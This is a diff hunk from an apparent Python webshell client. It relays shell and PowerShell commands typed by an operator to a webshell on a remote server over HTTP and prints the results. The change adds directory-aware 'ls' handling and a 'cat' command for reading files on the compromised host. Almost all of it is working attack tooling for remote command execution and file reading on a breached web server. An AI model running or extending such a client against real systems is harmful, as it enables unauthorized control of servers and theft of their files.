@@ -91,15 +91,23 @@ try:
                             path = command.split()[1]   
                    else:
                       if "ls" in command.split()[0] or "dir" in command.split()[0]:
-                         content = send_command("ls " + path, WEBSHELL, HTTP_METHOD, PARAM)
-                         print (colored(content, "yellow"))
-                      else:
-                         if args.ps:
-                            result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                            print (colored(result, "yellow"))
+                         if slash in command or "-" in command:
+                            content = send_command("ls " + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                            print (colored(content, "yellow"))
                          else:
-                            result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                            print (colored(result, "yellow"))
+                            content = send_command("ls " + path.rstrip(), WEBSHELL, HTTP_METHOD, PARAM)
+                            print (colored(content, "yellow"))
+                      else:
+                         if "cat" in command.split()[0]:
+                            content = send_command("cat " + path.rstrip() + slash + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
+                            print (colored(content, "yellow"))
+                         else:
+                            if args.ps:
+                               result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                               print (colored(result, "yellow"))
+                            else:
+                               result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                               print (colored(result, "yellow"))
 
        except KeyboardInterrupt:
           print (colored("\nExiting..\n", "red"))
